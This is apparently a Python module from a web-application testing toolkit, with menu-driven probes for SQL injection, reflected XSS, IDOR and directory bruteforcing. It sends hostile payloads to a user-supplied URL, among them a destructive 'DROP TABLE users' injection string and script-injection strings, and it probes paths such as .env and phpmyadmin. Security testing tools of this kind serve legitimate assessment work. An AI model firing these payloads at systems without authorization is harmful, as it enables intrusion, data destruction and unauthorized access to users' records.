import requests
from utils.banner import print_module_header, success, error, info, warn
from utils.helpers import save_results, press_enter

def run():
    print_module_header("Web App Testing")
    print("  [1]  SQL Injection Tester")
    print("  [2]  XSS Scanner")
    print("  [3]  IDOR Tester")
    print("  [4]  Directory Bruteforcer")
    print("  [0]  Back")
    choice = input("\n  Select option: ").strip()

    if choice == "1":   sqli_test()
    elif choice == "2": xss_scan()
    elif choice == "3": idor_test()
    elif choice == "4": dir_brute()
    press_enter()

def sqli_test():
    url = input("\n  Enter URL with parameter (e.g. http://site.com/item?id=1): ").strip()
    payloads = ["'", "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
                "' OR 'x'='x", "1; DROP TABLE users--", "' UNION SELECT NULL--"]
    info(f"Testing SQLi on {url}")
    findings = []
    errors   = ["sql","syntax","mysql","ora-","error in your sql","unclosed"]
    for p in payloads:
        test_url = url + p
        try:
            r = requests.get(test_url, timeout=5)
            triggered = any(e in r.text.lower() for e in errors)
            if triggered:
                success(f"Potential SQLi → payload: {p}")
                findings.append({"url": test_url, "payload": p, "status": r.status_code})
            else:
                info(f"No error  → payload: {p}")
        except Exception as e:
            error(f"Request failed: {e}")
    if findings:
        path = save_results("sqli", findings)
        info(f"Findings saved → {path}")
    else:
        warn("No SQLi indicators found.")

def xss_scan():
    url = input("\n  Enter URL with parameter (e.g. http://site.com/search?q=test): ").strip()
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "'><script>alert(1)</script>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
    ]
    info(f"Testing XSS on {url}")
    findings = []
    for p in payloads:
        test_url = url + p
        try:
            r = requests.get(test_url, timeout=5)
            if p.lower() in r.text.lower():
                success(f"Reflected XSS → payload: {p}")
                findings.append({"url": test_url, "payload": p})
            else:
                info(f"Not reflected → payload: {p}")
        except Exception as e:
            error(f"Request failed: {e}")
    if findings:
        path = save_results("xss", findings)
        info(f"Findings saved → {path}")
    else:
        warn("No reflected XSS found.")

def idor_test():
    url    = input("\n  Enter URL with ID (e.g. http://site.com/api/users/1): ").strip()
    token  = input("  Enter auth token (or leave blank): ").strip()
    start  = int(input("  Start ID: ").strip())
    end    = int(input("  End ID:   ").strip())
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    info(f"Testing IDOR from ID {start} to {end}...")
    findings = []
    base_url = url.rsplit("/", 1)[0]
    for i in range(start, end + 1):
        test_url = f"{base_url}/{i}"
        try:
            r = requests.get(test_url, headers=headers, timeout=5)
            if r.status_code == 200:
                success(f"ID {i} → 200 OK ({len(r.content)} bytes) 🚨")
                findings.append({"id": i, "url": test_url, "size": len(r.content)})
            else:
                info(f"ID {i} → {r.status_code}")
        except Exception as e:
            error(f"Request failed: {e}")
    if findings:
        path = save_results("idor", findings)
        info(f"{len(findings)} findings saved → {path}")
    else:
        warn("No IDOR findings.")

def dir_brute():
    url      = input("\n  Enter base URL (e.g. http://site.com): ").strip().rstrip("/")
    wordlist = ["admin","login","dashboard","backup","config","api",
                "uploads","files","test","dev","staging","robots.txt",
                ".env","wp-admin","phpmyadmin","console","secret"]
    info(f"Bruteforcing directories on {url}...")
    findings = []
    for word in wordlist:
        test_url = f"{url}/{word}"
        try:
            r = requests.get(test_url, timeout=5)
            if r.status_code in [200, 301, 302, 403]:
                success(f"[{r.status_code}] {test_url}")
                findings.append({"url": test_url, "status": r.status_code})
            else:
                info(f"[{r.status_code}] {test_url}")
        except Exception as e:
            error(f"Failed: {e}")
    if findings:
        path = save_results("dirbust", findings)
        info(f"{len(findings)} paths found → {path}")
    else:
        warn("Nothing interesting found.")
